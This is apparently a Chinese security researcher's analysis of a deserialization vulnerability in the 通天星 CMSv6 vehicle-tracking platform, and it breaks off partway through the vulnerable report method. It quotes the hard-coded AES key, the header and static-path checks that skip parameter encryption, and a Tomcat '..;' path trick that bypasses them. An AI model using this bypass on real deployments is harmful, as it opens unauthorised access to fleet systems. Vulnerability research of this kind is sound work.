<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="584753cc276e32bb148a794be045f9c4">通天星CMSv6 Japser反序列化漏洞分析</h1>
<h2 data-content="1" id="44928dc01e5fa2f1b7cd19c658d57094">一、版本说明</h2>
<p>根据通告得知漏洞在7.33.0.7_20240508及其以下有效。实测发现：</p>
<p>1、上传接口在7.33.0.7_20240508及其以下有效：</p>
<p>2、反序列化链条：最新版7.34.0.7_20240719版本仍然存在</p>
<h2 data-content="1" id="113b3cc45ea130ebe78a68caa4c1e159">二、漏洞分析</h2>
<h3 data-content="1" id="8cd1e1da0522404cf72319c574a886b6">2.1 路由参数加密</h3>
<h4 data-content="1" id="bd00fc36318f5bb92d93f373953adeb2">2.1.1 参数加密过程和Bypass</h4>
<p>通天星有的路由需要将参数进行加密后才能进行正常的传参请求，不然响应会报错：<code>param_must_encry/参数必须加密参数</code>，result响应1。如果是提示result响应2的话，则是表示该路由需要登录后才能访问。所有的错误码可以在这里查找<code>808gps/js/lang.js</code>对应的含义。</p>
<p><code>public.js</code>含有对参数加密的前台js加密代码。其中<code>encrypt</code>通过对aes ecb模式进行加密。其中密钥<code>key</code>可以在后续js代码进行查看。</p>
<div class="highlight"><pre><span></span><span class="cm">/**</span>
<span class="cm"> * AES encryption (need to load lib/aes/aes.min.js file first)</span>
<span class="cm"> * @param word</span>
<span class="cm"> * @returns {*}</span>
<span class="cm"> */</span>
<span class="kd">function</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nx">word</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">word</span><span class="p">){</span>
        <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">srcs</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">word</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">encrypted</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">srcs</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="p">{</span><span class="nx">mode</span><span class="o">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">ECB</span><span class="p">,</span> <span class="nx">padding</span><span class="o">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span><span class="p">});</span>
    <span class="k">return</span> <span class="nx">encrypted</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p><code>getKey()</code>是获取密钥的代码，可以看到密钥直接硬编码在js里面是<code>ttx123456Aes1234</code>。参数可以通过加密后就能传输了。</p>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">webParseKey</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">getKey</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">webParseKey</span><span class="p">){</span>
        <span class="k">return</span> <span class="nx">webParseKey</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="s2">"ttx"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="s2">"Aes1234"</span><span class="p">;</span>
    <span class="nx">webParseKey</span> <span class="o">=</span> <span class="nx">ret</span> <span class="o">+</span> <span class="nx">getNumberKey</span><span class="p">()</span> <span class="o">+</span> <span class="nx">str</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">webParseKey</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>除了按照正常流程对其参数进行加密后再请求，还可以通过特定的路由进行参数加密绕过。在<code>struts.xml</code>配置文件可以发现有定义filter，filter文件夹在<code>webapps/gpsweb/WEB-INF/classes/com/gpsCommon/filter</code>，其中<code>com.gpsCommon.filter.DecryptFilter::doFilter()</code>有说明是<code>OPTION</code>方法请求、http请求包中存在<code>ttxdownload</code>头就可以不用参数加密就进入后续拦截器，最后正常发送请求。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">chain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">BusinessException</span> <span class="o">{</span>
        <span class="n">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span><span class="n">servletRequest</span><span class="o">;</span>
        <span class="n">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletResponse</span><span class="o">)</span><span class="n">servletResponse</span><span class="o">;</span>
        <span class="n">XssHttpServletRequestWrapperNew</span> <span class="n">requestWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XssHttpServletRequestWrapperNew</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(!</span><span class="s">"OPTIONS"</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">())</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">isStaticResource</span><span class="o">(</span><span class="n">url</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">ttxdownLoad</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"ttxdownLoad"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">StringUtils</span><span class="o">.</span><span class="na">isNotBlank</span><span class="o">(</span><span class="n">ttxdownLoad</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">chain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">requestWrapper</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="o">......</span>
</pre></div>
<p>在判断是否是<code>OPTION</code>方法的同时如果uri存在静态资源路径，也可以不用加密。在<code>isStaticResource()</code>可以查看：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">final</span> <span class="kt">boolean</span> <span class="nf">isStaticResource</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">boolean</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">StringUtils</span><span class="o">.</span><span class="na">isBlank</span><span class="o">(</span><span class="n">url</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="n">Objects</span><span class="o">.</span><span class="na">equal</span><span class="o">(</span><span class="s">"/"</span><span class="o">,</span> <span class="n">url</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/ws"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/wss"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/h5/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/examh5"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/js/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/css/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/font/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/gener/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/geo/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/images/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/map/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/mobile/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/offlinemap/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/product/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/safeProductTemplate/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/template/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/upgrade/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/upload/"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">url</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"/uploadZip/"</span><span class="o">))</span> <span class="o">{</span>
            <span class="kt">int</span> <span class="n">start</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">lastIndexOf</span><span class="o">(</span><span class="s">"."</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">start</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">prex</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">start</span><span class="o">,</span> <span class="n">url</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
                <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">staticResourceTypes</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">prex</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></div>
<p>结合通天星使用的是tomcat web服务器（解析分号和问号），可以这样绕过参数加密，例如<code>/ws/..;/StandardPositionAction_refreshGpsStatus.action</code>，然后参数正常按照请求方式请求即可。</p>
<h4 data-content="1" id="8702fd604a163a37bda12f5996cda423">2.2.2 哪些路由的参数需要加密？</h4>
<p><code>struts.xml</code>文件有定义通天性访问路由的两种格式：<code>**/*_*.action</code>（web请求通用配置）和<code>*_*.action</code>（api请求通用配置）。这两种形式的路由都要进行参数加密。</p>
<div class="highlight"><pre><span></span><span class="c">&lt;!-- =========web请求通用配置========== --&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">"**/*_*.action"</span> <span class="na">class=</span><span class="s">"{2}"</span> <span class="na">method=</span><span class="s">"{3}"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">type=</span><span class="s">"customjson"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"input"</span> <span class="na">type=</span><span class="s">"customjson"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"excel"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/vnd.ms-excel<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"csv"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/csv<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"pdf"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/pdf<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>2048<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"image"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>image/jpeg<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>inputStream<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"media"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/*<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>fileInputStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>2048<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"zip"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/x-msdownload<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"video"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="c">&lt;!-- 下载文件类型定义 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/octet-stream<span class="nt">&lt;/param&gt;</span>
                <span class="c">&lt;!-- 下载文件输出流定义 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>inputStream<span class="nt">&lt;/param&gt;</span>　　　　　　　　　　　　　　　　　　
                <span class="c">&lt;!-- 下载文件处理方式 --&gt;</span> 　　　　　　　　　　　　　　　　
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${fileName}"<span class="nt">&lt;/param&gt;</span>
                <span class="c">&lt;!-- 下载文件的缓冲大小 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>

            <span class="c">&lt;!-- 页面重定向  --&gt;</span>
            <span class="c">&lt;!--    &lt;result name="redirect" type="redirect"&gt;</span>
<span class="c">                        &lt;param name="location"&gt;/808gps/index.html&lt;/param&gt;　　　　　　　　　　　　　　　</span>
<span class="c">                    &lt;param name="clientLogin"&gt;2&lt;/param&gt;</span>
<span class="c">                    &lt;param name="userSession"&gt;${userSession}&lt;/param&gt;</span>
<span class="c">              &lt;/result&gt; --&gt;</span>
        <span class="nt">&lt;/action&gt;</span>

        <span class="c">&lt;!-- =========API请求通用配置========== --&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">"*_*.action"</span> <span class="na">class=</span><span class="s">"{1}"</span> <span class="na">method=</span><span class="s">"{2}"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">type=</span><span class="s">"customjson"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"input"</span> <span class="na">type=</span><span class="s">"customjson"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"excel"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/vnd.ms-excel<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"csv"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/csv<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"pdf"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/pdf<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>2048<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"image"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>image/jpeg<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>inputStream<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"media"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/*<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>fileInputStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>2048<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"zip"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/x-msdownload<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>excelStream<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${excelFile}"<span class="nt">&lt;/param&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>
            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">"video"</span> <span class="na">type=</span><span class="s">"stream"</span><span class="nt">&gt;</span>
                <span class="c">&lt;!-- 下载文件类型定义 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentType"</span><span class="nt">&gt;</span>application/octet-stream<span class="nt">&lt;/param&gt;</span>
                <span class="c">&lt;!-- 下载文件输出流定义 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"inputName"</span><span class="nt">&gt;</span>inputStream<span class="nt">&lt;/param&gt;</span>　　　　　　　　　　　　　　　　　　
                <span class="c">&lt;!-- 下载文件处理方式 --&gt;</span> 　　　　　　　　　　　　　　　　
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"contentDisposition"</span><span class="nt">&gt;</span>attachment;filename="${fileName}"<span class="nt">&lt;/param&gt;</span>
                <span class="c">&lt;!-- 下载文件的缓冲大小 --&gt;</span>
                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bufferSize"</span><span class="nt">&gt;</span>4096<span class="nt">&lt;/param&gt;</span>
            <span class="nt">&lt;/result&gt;</span>

            <span class="c">&lt;!-- 页面重定向  --&gt;</span>
            <span class="c">&lt;!--    &lt;result name="redirect" type="redirect"&gt;</span>
<span class="c">                        &lt;param name="location"&gt;/808gps/index.html&lt;/param&gt;　　　　　　　　　　　　　　　</span>
<span class="c">                    &lt;param name="clientLogin"&gt;2&lt;/param&gt;</span>
<span class="c">                    &lt;param name="userSession"&gt;${userSession}&lt;/param&gt;</span>
<span class="c">              &lt;/result&gt; --&gt;</span>
        <span class="nt">&lt;/action&gt;</span>
</pre></div>
<h3 data-content="1" id="c2f3f5dbc7667c1711996d1ad4f3cd8a">2.2  Jasper反序列化链条</h3>
<p><code>webapps/gpsweb/WEB-INF/classes/com/gps808/operationManagement/action/StandardLineAction.class</code>的<code>report</code>方法应该是生成各类报告的接口，其中get方式获取的name参数未经过滤传入<code>print = this.getReportCreate().createReport(name);</code>。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">report</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">format</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getRequestString</span><span class="o">(</span><span class="s">"format"</span><span class="o">);</span><span class="c1">//导出格式，测试发现可选html、pdf、xlxs</span>
            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getRequestString</span><span class="o">(</span><span class="s">"name"</span><span class="o">);</span><span class="c1">//报告名</span>
            <span class="n">String</span> <span class="n">lid</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getRequestString</span><span class="o">(</span><span class="s">"id"</span><span class="o">);</span><span class="c1">//公告id</span>
            <span class="n">String</span> <span class="n">direct</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getRequestString</span><span class="o">(</span><span class="s">"direct"</span><span class="o">);</span><span class="c1">//偏移量</span>
            <span class="n">String</span> <span class="n">disposition</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getRequestString</span><span class="o">(</span><span class="s">"disposition"</span><span class="o">);</span><span class="c1">//显示方式</span>
            <span class="n">String</span> <span class="n">reportTitle</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
            <span class="n">StandardCompany</span> <span class="n">line</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardCompany</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">standardLineService</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">StandardCompany</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">lid</span><span class="o">));</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">line</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">reportTitle</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">direct</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
